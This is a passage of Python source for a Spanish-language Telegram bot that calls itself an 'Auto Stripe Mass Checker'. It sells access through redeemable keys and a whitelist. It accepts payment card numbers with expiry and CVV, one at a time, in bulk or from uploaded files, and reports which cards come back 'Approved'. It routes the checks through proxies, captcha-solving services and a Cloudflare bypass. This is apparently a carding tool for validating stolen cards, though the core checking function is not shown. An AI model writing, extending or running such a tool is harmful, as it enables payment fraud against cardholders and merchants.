    exp_date = datetime.datetime.fromtimestamp(key_info["expires_at"]).strftime('%Y-%m-%d %H:%M:%S')
    
    await update.message.reply_text(
        f"ðŸ”‘ *Key Generada Exitosamente*\n\n"
        f"Key: `{key_info['key']}`\n"
        f"DÃ­as vÃ¡lidos: `{key_info['days']}`\n"
        f"Expira (si no se redime): `{exp_date}`\n\n"
        f"El usuario debe usar:\n"
        f"`/redeem {key_info['key']}`",
        parse_mode='Markdown'
    )


async def keys_list(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("âŒ No tienes permisos.")
        return
    
    keys_db = load_json(KEYS_FILE)
    
    if not keys_db:
        await update.message.reply_text("ðŸ“­ No hay keys generadas aÃºn.")
        return
    
    total = len(keys_db)
    redeemed = sum(1 for k in keys_db.values() if k.get("redeemed"))
    pending = total - redeemed
    expired = sum(1 for k in keys_db.values() if not k.get("redeemed") and k["expires_at"] < time.time())
    
    lines = [f"ðŸ“Š *Keys: {total} total | {redeemed} redimidas | {pending} pendientes | {expired} vencidas*\n"]
    
    for key_id, key_data in sorted(keys_db.items(), key=lambda x: x[1]["created_at"], reverse=True)[:20]:
        created = datetime.datetime.fromtimestamp(key_data["created_at"]).strftime('%m-%d %H:%M')
        status_icon = "âœ…" if key_data["redeemed"] else "â³"
        redeemed_by = f"â†’ User `{key_data['redeemed_by']}`" if key_data["redeemed_by"] else ""
        
        lines.append(f"{status_icon} `{key_id}` | {key_data['days_valid']}d | Creada: {created} {redeemed_by}")
    
    response = '\n'.join(lines)
    if len(lines) > 20:
        response += f"\n\nâš ï¸ Mostrando las Ãºltimas 20 keys de {total} totales."
    
    await update.message.reply_text(response, parse_mode='Markdown')


async def whitelist_view(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("âŒ No tienes permisos.")
        return
    
    whitelist = load_json(WHITELIST_FILE)
    
    now = int(time.time())
    whitelist = {uid: exp for uid, exp in whitelist.items() if exp > now}
    save_json(WHITELIST_FILE, whitelist)
    
    if not whitelist:
        await update.message.reply_text("ðŸ“­ No hay usuarios en la whitelist activa.")
        return
    
    lines = [f"ðŸ“‹ *Whitelist activa: {len(whitelist)} usuario(s)*\n"]
    
    for uid, expiration in sorted(whitelist.items(), key=lambda x: x[1]):
        remaining = expiration - now
        days = remaining // 86400
        hours = (remaining % 86400) // 3600
        exp_date = datetime.datetime.fromtimestamp(expiration).strftime('%Y-%m-%d %H:%M')
        lines.append(f"ðŸ‘¤ User `{uid}` â†’ Exp: `{exp_date}` ({days}d {hours}h restantes)")
    
    await update.message.reply_text('\n'.join(lines), parse_mode='Markdown')


async def chk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not check_access(update):
        await update.message.reply_text(
            "âŒ No tienes acceso. Usa `/redeem <key>` si tienes una key.",
            parse_mode='Markdown'
        )
        return

    if not context.args:
        await update.message.reply_text(
            "âŒ Uso: `/chk num|mm|yy|cvv`\n"
            "Ejemplo: `/chk 4242424242424242|12|25|123`",
            parse_mode='Markdown'
        )
        return

    card_raw = ' '.join(context.args)
    cards = parse_cards(card_raw, max_cards=1)
    
    if not cards:
        await update.message.reply_text(
            "âŒ Formato invÃ¡lido. Usa: `num|mm|yy|cvv`",
            parse_mode='Markdown'
        )
        return

    msg = await update.message.reply_text("â³ Procesando tarjeta...")

    loop = asyncio.get_event_loop()
    result = await loop.run_in_executor(None, process_card, cards[0], proxies_list, 1)

    status_icon = "âœ…" if "Approved" in result else "âŒ"
    response = f"{status_icon} *Resultado:*\n`{result}`"
    
    await msg.edit_text(response, parse_mode='Markdown')


async def mass_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not check_access(update):
        await update.message.reply_text(
            "âŒ No tienes acceso. Usa `/redeem <key>` si tienes una key.",
            parse_mode='Markdown'
        )
        return ConversationHandler.END

    await update.message.reply_text(
        f"ðŸ“¤ EnvÃ­a las tarjetas (mÃ¡ximo {MAX_MASS}) una por lÃ­nea.\n"
        f"Formato: `num|mm|yy|cvv`\n\n"
        "Ejemplo:\n"
        "```\n4242424242424242|12|25|123\n"
        "4000056655665556|10|26|456\n```\n\n"
        "Escribe /cancel para cancelar.",
        parse_mode='Markdown'
    )
    return MASS_WAIT_CARDS


async def mass_receive_cards(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text

    if text.lower() == '/cancel':
        await update.message.reply_text("âŒ OperaciÃ³n cancelada.")
        return ConversationHandler.END

    cards = parse_cards(text, max_cards=MAX_MASS)
    
    if not cards:
        await update.message.reply_text(
            "âŒ No se encontraron tarjetas vÃ¡lidas. AsegÃºrate del formato `num|mm|yy|cvv`\n\n"
            "Intenta de nuevo o escribe /cancel",
            parse_mode='Markdown'
        )
        return MASS_WAIT_CARDS

    if len(cards) < len([l for l in text.strip().split('\n') if l.strip()]):
        diff = len([l for l in text.strip().split('\n') if l.strip()]) - len(cards)
        if diff > 0:
            await update.message.reply_text(f"âš ï¸ {diff} lÃ­nea(s) omitida(s) por formato invÃ¡lido.")

    await run_with_progress(update, cards, origin_prefix="Mass Check | ")
    return ConversationHandler.END


async def mass_cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("âŒ OperaciÃ³n cancelada.")
    return ConversationHandler.END


async def mtxt_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not check_access(update):
        await update.message.reply_text(
            "âŒ No tienes acceso. Usa `/redeem <key>` si tienes una key.",
            parse_mode='Markdown'
        )
        return ConversationHandler.END

    await update.message.reply_text(
        f"ðŸ“Ž EnvÃ­a un archivo `.txt` con las tarjetas (mÃ¡ximo {MAX_FILE_CARDS}).\n"
        f"Formato: `num|mm|yy|cvv` (una por lÃ­nea)\n\n"
        "Ejemplo del contenido:\n"
        "```\n4242424242424242|12|25|123\n"
        "4000056655665556|10|26|456\n```\n\n"
        "Escribe /cancel para cancelar.",
        parse_mode='Markdown'
    )
    return MTXT_WAIT_FILE


async def mtxt_receive_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message.document:
        await update.message.reply_text(
            "âŒ Por favor envÃ­a un archivo .txt vÃ¡lido.\n"
            "Intenta de nuevo o escribe /cancel",
        )
        return MTXT_WAIT_FILE

    doc = update.message.document
    
    if not doc.file_name.endswith('.txt'):
        await update.message.reply_text(
            "âŒ Solo se aceptan archivos `.txt`.\n"
            "Intenta de nuevo o escribe /cancel",
        )
        return MTXT_WAIT_FILE

    file = await doc.get_file()
    tmp_path = f"/tmp/mtxt_{update.effective_user.id}_{int(time.time())}.txt"
    await file.download_to_drive(tmp_path)

    try:
        with open(tmp_path, 'r') as f:
            content = f.read()
        
        cards = parse_cards(content, max_cards=MAX_FILE_CARDS)
        
        if not cards:
            await update.message.reply_text(
                "âŒ No se encontraron tarjetas vÃ¡lidas en el archivo.\n"
                "Formato esperado: `num|mm|yy|cvv` (una por lÃ­nea)",
                parse_mode='Markdown'
            )
            return ConversationHandler.END

        lines_in_file = len([l for l in content.strip().split('\n') if l.strip()])
        if lines_in_file > MAX_FILE_CARDS:
            await update.message.reply_text(
                f"âš ï¸ El archivo contiene {lines_in_file} lÃ­neas. "
                f"Solo se procesarÃ¡n las primeras {MAX_FILE_CARDS}."
            )
        elif lines_in_file > len(cards):
            diff = lines_in_file - len(cards)
            await update.message.reply_text(f"âš ï¸ {diff} lÃ­nea(s) omitida(s) por formato invÃ¡lido.")

        await run_with_progress(update, cards, origin_prefix="File Check | ")

    except Exception as e:
        await update.message.reply_text(f"âŒ Error al leer el archivo: {str(e)}")
    finally:
        if os.path.exists(tmp_path):
            os.remove(tmp_path)

    return ConversationHandler.END


async def mtxt_cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("âŒ OperaciÃ³n cancelada.")
    return ConversationHandler.END


async def unknown_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "âŒ Comando desconocido. Usa /help para ver los comandos disponibles."
    )


# ========== MAIN ==========
def main():
    if BOT_TOKEN == 'YOUR_BOT_TOKEN_HERE':
        logger.error("=== CONFIGURA EL BOT_TOKEN en variables de entorno ===")
        print("ERROR: Configura BOT_TOKEN como variable de entorno.")
        print("Ejemplo: export BOT_TOKEN='tu_token_aqui'")
        return

    app = Application.builder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler('start', start))
    app.add_handler(CommandHandler('help', help_cmd))
    app.add_handler(CommandHandler('status', status))
    app.add_handler(CommandHandler('redeem', redeem))
    app.add_handler(CommandHandler('chk', chk))
    app.add_handler(CommandHandler('genkey', genkey))
    app.add_handler(CommandHandler('keys', keys_list))
    app.add_handler(CommandHandler('whitelist', whitelist_view))

    mass_conv_handler = ConversationHandler(
        entry_points=[CommandHandler('mass', mass_start)],
        states={
            MASS_WAIT_CARDS: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, mass_receive_cards),
                CommandHandler('cancel', mass_cancel),
            ],
        },
        fallbacks=[CommandHandler('cancel', mass_cancel)],
    )
    app.add_handler(mass_conv_handler)

    mtxt_conv_handler = ConversationHandler(
        entry_points=[CommandHandler('mtxt', mtxt_start)],
        states={
            MTXT_WAIT_FILE: [
                MessageHandler(filters.Document.FileExtension("txt"), mtxt_receive_file),
                MessageHandler(filters.TEXT & ~filters.COMMAND, mtxt_receive_file),
                CommandHandler('cancel', mtxt_cancel),
            ],
        },
        fallbacks=[CommandHandler('cancel', mtxt_cancel)],
    )
    app.add_handler(mtxt_conv_handler)

    app.add_handler(MessageHandler(filters.COMMAND, unknown_command))

    logger.info("=== Auto Stripe Mass Checker Bot ===")
    logger.info(f"Bot Token: {BOT_TOKEN[:8]}...{BOT_TOKEN[-4:]}")
    logger.info(f"Proxies cargados: {len(proxies_list)}")
    logger.info(f"Admins: {ADMIN_IDS if ADMIN_IDS else 'No configurados'}")
    logger.info(f"Usuarios estÃ¡ticos: {'Todos' if not ALLOWED_USERS else ALLOWED_USERS}")
    logger.info(f"Captcha API Key: {'âœ… Configurada (' + CAPTCHA_SERVICE + ')' if NOPECHA_API_KEY else 'âŒ No configurada'}")
    logger.info(f"Cloudflare bypass: {'âœ… cloudscraper instalado' if HAS_CLOUDSCRAPER else 'âŒ No instalado (pip install cloudscraper)'}")
    
    print("\n" + "="*60)
    print("ðŸ¤– Auto Stripe Mass Checker Bot")
    print("="*60)
    print(f"\nðŸ“¡ Captcha: {'âœ… ' + CAPTCHA_SERVICE if NOPECHA_API_KEY else 'âŒ Sin API key'}")
    print(f"â˜ï¸ Cloudflare: {'âœ… Bypass activo' if HAS_CLOUDSCRAPER else 'âŒ Instala: pip install cloudscraper'}")
    print(f"ðŸ”‘ Keys: {KEYS_FILE}")
    print(f"ðŸ“‹ Whitelist: {WHITELIST_FILE}")
    print(f"\nðŸš€ Bot iniciado. Presiona Ctrl+C para detener.\n")
    
    app.run_polling(allowed_updates=Update.ALL_TYPES)


if __name__ == '__main__':
    main()
